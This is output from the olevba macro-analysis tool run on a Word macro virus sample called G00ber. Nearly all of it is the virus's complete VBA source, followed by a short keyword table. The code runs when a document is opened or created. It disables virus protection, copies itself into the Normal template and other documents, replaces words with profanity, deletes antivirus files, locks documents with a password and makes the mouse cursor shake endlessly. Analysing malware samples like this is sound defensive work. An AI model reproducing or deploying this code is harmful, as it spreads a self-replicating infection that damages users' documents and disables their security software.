olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goober-5a780014661d9c5143e81616bffe9437725c75ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goober-5a780014661d9c5143e81616bffe9437725c75ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetCursorPos Lib "USER32" _
        (ByVal x As Long, ByVal y As Long) As Long

Private Declare Function GetCursorPos Lib "USER32" _
        (lpPoint As Punkt) As Long

Private Type Punkt
           xAchse As Long
           yAchse As Long
 End Type

Private Declare Sub Sleep Lib "kernel32" _
        (ByVal dwMilliseconds As Long)
Private Sub document_Open(): On Error Resume Next:

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.ConfirmConversions = (0 - 0)
Options.SaveNormalPrompt = (1 - 1)
Options.VirusProtection = (2 - 2)
CommandBars("Tools").Controls("Macro").Delete

Open "C:\G00ber.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName

Set myRange = ActiveDocument.Range(Start:=0, End:=0)
With myRange.Find
    .ClearFormatting
    .Text = "The"
    With .Replacement
        .ClearFormatting
        .Text = "ShiThe!"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With

With myRange.Find
    .ClearFormatting
    .Text = "the"
    With .Replacement
        .ClearFormatting
        .Text = "shithe!"
    End With
    .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=True, _
        MatchWholeWord:=True
End With

With Dialogs(wdDialogFileSummaryInfo)
.Author = "~CaM~"
.Title = "WM97/G00ber"
.Subject = "G00ber Infection"
.Comments = "College, the best educational tool of all!"
.Keywords = "Nothing like a G00ber infection"
.Execute
End With
End Sub
Private Sub document_New(): On Error Resume Next:

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.ConfirmConversions = (0 - 0)
Options.SaveNormalPrompt = (1 - 1)
Options.VirusProtection = (2 - 2)
CommandBars("Tools").Controls("Macro").Delete

Open "C:\G00ber.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\G00ber.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName
    
With Dialogs(wdDialogFileSummaryInfo)
.Author = "~CaM~"
.Title = "WM97/G00ber"
.Subject = "G00ber Infection"
.Comments = "College, the best educational tool of all!"
.Keywords = "Nothing like a G00ber infection"
.Execute
End With
End Sub
Private Sub ToolsOptions()
On Error GoTo Error
Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "You have awaken G00ber!!! This makes me very Mad!"
.Heading = "Word Macro Virus G00ber!"
.Animation = msoAnimationSearching
.Show
End With
Kill "c:\Program files\Command Software\*.*"
Kill "c:\program files\norton antivirus\Virscan2.dat"
ActiveDocument.Password = "G00ber"
Error:
End Sub


Private Sub FormatParagraph()
On Error GoTo Error
Dim dies As Long
Dim das As Long
Dim posPunkt As Punkt
MsgBox "G00ber iz super ticklish as you will soon see!!", vbCritical
Selection.InsertAfter "I love to use Microsoft Products cause they are so vulnerable to those damn Virus people.. ROFL!!!"
Do
    GetCursorPos posPunkt
    dies = Rnd(2)
          If dies = 0 Then dies = -5 Else dies = 5
    
    das = Rnd(2)
          If das = 0 Then das = -5 Else das = 5
          
SetCursorPos posPunkt.xAchse + dies, posPunkt.yAchse + das
Sleep 2
DoEvents
    Loop
Error:
End Sub

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'^  Haz Americaz Youths Education gone to Waste??? ^
'^  Maybe?, but for now I proudly Present upon you ^
'^  G00ber by ~CaM~                                ^
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_New        |Runs when a new Word document is created     |
|AutoExec  |document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

